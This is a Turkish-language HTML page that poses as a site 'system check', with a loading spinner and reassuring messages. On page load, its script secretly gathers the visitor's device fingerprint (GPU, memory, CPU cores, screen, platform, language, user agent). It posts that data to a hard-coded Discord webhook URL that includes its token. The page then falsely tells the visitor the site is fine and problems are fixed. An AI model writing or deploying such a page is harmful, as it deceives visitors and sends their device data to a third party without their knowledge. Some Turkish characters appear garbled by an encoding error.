<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body {
            background-color: #0f0f0f;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: sans-serif;
            color: #eeeeee;
        }
        .container { text-align: center; }
        .loader {
            border: 3px solid #333;
            border-top: 3px solid #00ff41; 
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 16px; }
        .success-text { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="msg">Site ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        function sistemVerileriniTopla() {
            let gpu = "Bilinmiyor";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
            } catch(e) {}

            return {
                embeds: [{
                    title: "üñ•Ô∏è Sƒ∞STEM ANALƒ∞Z RAPORU",
                    color: 3066993,
                    fields: [
                        { name: "‚öôÔ∏è DONANIM", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} √áekirdek`, inline: false },
                        { name: "üìè G√ñR√úNT√ú", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
                        { name: "üì± Sƒ∞STEM", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}`, inline: true },
                        { name: "üïí LOG", value: new Date().toLocaleString('tr-TR'), inline: false },
                        { name: "üîç USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                    ]
                }]
            };
        }

        async function sistemiCalistir() {
            const msg = document.getElementById('msg');
            const loader = document.getElementById('loader');
            const data = sistemVerileriniTopla();

            try {
                await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                navigator.sendBeacon(webhookURL, JSON.stringify(data));
            } catch (err) {}

            setTimeout(() => {
                loader.style.display = "none";
                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
                
                setTimeout(() => {
                    msg.innerHTML = '<span class="success-text">Sorunlar d√ºzeltildi.</span>';
                }, 1500);
            }, 3000); 
        }

        window.onload = sistemiCalistir;
    </script>
</body>
</html>
